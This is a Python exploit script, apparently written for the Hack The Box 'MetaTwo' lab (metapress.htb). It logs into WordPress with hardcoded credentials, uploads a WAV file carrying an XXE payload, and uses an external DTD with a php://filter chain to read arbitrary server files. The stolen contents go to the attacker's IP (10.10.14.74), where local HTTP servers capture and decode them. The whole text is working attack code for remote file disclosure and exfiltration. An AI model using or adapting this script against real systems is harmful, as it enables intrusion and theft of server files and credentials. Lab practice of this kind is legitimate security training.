#!/usr/bin/python3
import sys, base64, zlib, subprocess, requests, os, re
from http.server import HTTPServer, BaseHTTPRequestHandler, SimpleHTTPRequestHandler
from threading import Thread, current_thread

my_session = requests.Session()
external_dtd_filename = "xxe.dtd"
main_xml_filename = "something.wav"
my_ip = "10.10.14.74"
wpnonce = ''
nonce = ''
port_dl_server = 3000
proxy = {"http": "http://127.0.0.1:8080"}


def get_cookies():
    global my_session
    login_url = "http://metapress.htb/wp-login.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Origin": "http://metapress.htb",
    }
    data = "log=manager&pwd=partylikearockstar&wp-submit=Log+In&testcookie=1"

    my_session.post(login_url,headers=headers,data=data, proxies=proxy)

def get_nonce():
    global my_session, wpnonce, nonce
    url = "http://metapress.htb/wp-admin/upload.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Origin": "http://metapress.htb"
    }

    r = my_session.get(url,headers=headers, proxies=proxy)
    wpnonce = re.findall(r'"_wpnonce":"(.*)"',r.text)[0].split('"')[0]
    nonce = re.findall(r'"nonce":"(.*)"',r.text)[0].split('"')[0]


def post_admin_ajax():
    global my_session
    url = "http://metapress.htb/wp-admin/admin-ajax.php"

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "pl,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://metapress.htb/wp-admin/upload.php",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://metapress.htb",
    }

    data = f"interval=60&_nonce={nonce}&action=heartbeat&screen_id=upload&has_focus=false"
    r = my_session.post(url, data=data,headers=headers, proxies=proxy)


def upload_file(filepath):
    global my_session
    create_malicious_xml()
    create_external_dtd(filepath)
    if(wpnonce == '' or nonce == ''):
        get_nonce()


    data = {'name':f"{main_xml_filename}",
          'action':"upload-attachment",
          '_wpnonce':f"{wpnonce}",}

    files = {'async-upload': (f'{main_xml_filename}', open(f'{main_xml_filename}', 'rb'), 'audio/x-wav')}

    upload_url = "http://metapress.htb/wp-admin/async-upload.php"

    headers = {#"Content-Type": "multipart/form-data;",
              "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
              "Accept": "*/*",
              "Origin": "http://metapress.htb",
              "Referer": "http://metapress.htb/wp-admin/upload.php",
              "Accept-Language": "pl,en-US;q=0.7,en;q=0.3" }

    r = my_session.post(upload_url,headers=headers,data=data,files=files,proxies=proxy)


def create_malicious_xml():
    payload = f"./create_xxe_payload.sh {my_ip} {port_dl_server} {external_dtd_filename} {main_xml_filename}"
    #print(payload)
    os.system(payload)
 


def create_external_dtd(filepath):
    file_content = f"""<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource={filepath}">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://{my_ip}/?p=%file;'>" >"""
    with open(external_dtd_filename, "w") as f:
      f.write(file_content)


class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):

      sth = (self.path).replace('/?p=','').replace('\n','')
      self.send_response(200)
      self.decode_msg(sth)
      self.end_headers()

      return
      
  def decode_msg(self, msg):
      print(msg)
      proc = subprocess.Popen(f"php -r \"print(zlib_decode(base64_decode('{msg}')));\"", shell=True, stdout=subprocess.PIPE)
      print(proc.stdout.read().decode())


class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return

def start_server(dl_server):
    if(not dl_server):
        HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
    else:
        HTTPServer(("0.0.0.0", port_dl_server), QuietHandler).serve_forever()


thread_rec_server = Thread(target=start_server, args=(False,))
thread_dl_server = Thread(target=start_server, args=(True,))
thread_rec_server.setDaemon(True)
thread_dl_server.setDaemon(True)
thread_rec_server.start()
thread_dl_server.start()
print("Started HTTP server on port 80")
print("Getting cookie")
get_cookies()
get_nonce()
post_admin_ajax()

while True:
    filepath = input("Select file from path: ")
    upload_file(filepath)
